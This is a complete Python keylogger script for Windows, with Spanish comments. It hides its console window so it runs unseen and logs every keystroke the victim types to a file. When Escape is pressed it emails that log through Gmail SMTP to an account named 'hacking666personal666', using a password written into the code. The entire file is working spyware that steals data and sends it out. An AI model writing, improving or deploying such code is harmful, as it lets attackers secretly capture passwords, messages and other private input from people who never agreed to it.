import pynput.keyboard
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import  win32console
import win32gui

ventana = win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana,0)
lista_teclas=[]
log=open("log.txt","w+")

def enviar_datos():
    msg = MIMEMultipart()
    password = "Meta!Salsa987"
    msg['From']="hacking666personal666@gmail.com"
    msg['To']="hacking666personal666@gmail.com"
    msg['Subject']="Keylogger"
    f = open('log.txt','r')
    msg.attach(MIMEText(f.read()))
    try:
        server = smtplib.SMTP('smtp.gmail.com: 587')
        server.starttls()
        server.login(msg['From'],password)
        server.sendmail(msg['From'],msg['To'],msg.as_string())
        server.quit()

    except:
        print('Error enviando correo')




def imprimir():
    teclas=''.join(lista_teclas)
    log.write(teclas)
    log.write('\n')
    log.close()
    time.sleep(3) #despues de 3 segundos
    enviar_datos()


def presiona(key):
    key1=convertir(key)

    if key1 == "Key.esc":
        print("Saliendo...")
        imprimir()
        return False
    elif key1 == "Key.space":
        lista_teclas.append(" ")
    elif key1 == "Key.enter":
        lista_teclas.append('\n')
    elif key1 == "Key.backspace":
        pass
    elif key1 == "Key.shift":
        pass
    elif key1 == "Key.tab":
        pass
    elif key1 == "Key.cmd": #en caso linux
        pass
    else:
        lista_teclas.append(key1)



def convertir(key):
    if isinstance(key,pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)

with pynput.keyboard.Listener(on_press=presiona) as listen:
    listen.join()

